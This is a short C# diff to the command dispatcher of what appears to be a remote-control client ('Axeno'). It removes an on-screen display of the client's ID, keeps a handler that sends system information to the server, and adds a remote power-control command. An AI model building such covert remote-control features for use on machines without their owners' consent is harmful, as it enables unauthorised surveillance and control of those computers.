@@ -41,13 +41,17 @@ namespace Axeno.Client.Networking
                     case "ClientUID":
                         {
                             string uid = msgpck.ForcePathObject("UID").AsString;
-                            MessageBox.Show(uid);
                             ClientControl.SaveUID(uid);
                             break;
                         }
                     case "GetSysInfo":
                         {
                             ClientSocket.Send(GetSystemInfo.Retrieve());
+                            break;
+                        }
+                    case "Power":
+                        {
+                            PowerControl.HandlePower(msgpck);
                             break;
                         }
                 }
